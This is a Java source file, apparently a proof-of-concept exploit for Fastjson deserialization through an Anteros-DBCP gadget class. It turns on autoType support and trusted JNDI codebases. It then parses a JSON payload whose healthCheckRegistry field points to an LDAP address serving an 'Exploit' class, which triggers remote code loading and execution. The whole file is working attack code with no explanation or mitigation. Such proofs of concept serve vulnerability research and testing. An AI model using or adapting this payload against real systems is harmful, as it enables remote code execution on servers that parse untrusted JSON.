package com.test.fastjson;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.ParserConfig;

/**
 * <dependency>
 *   <groupId>br.com.anteros</groupId>
 *   <artifactId>Anteros-DBCP</artifactId>
 *   <version>1.0.0</version>
 *  </dependency>
 * @Author:Wadewfsssss
 */

public class AnterosDBSonfig {

    public static void main(String[] args) {
        System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "true");
        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);

        String payload = "{\"@type\":\"br.com.anteros.dbcp.AnterosDBCPConfig\",\"healthCheckRegistry\":\"ldap://127.0.0.1:1389/Exploit\"}";
        try {
            JSON.parseObject(payload);
        }catch (Exception e){
            e.printStackTrace();
        }

    }
}
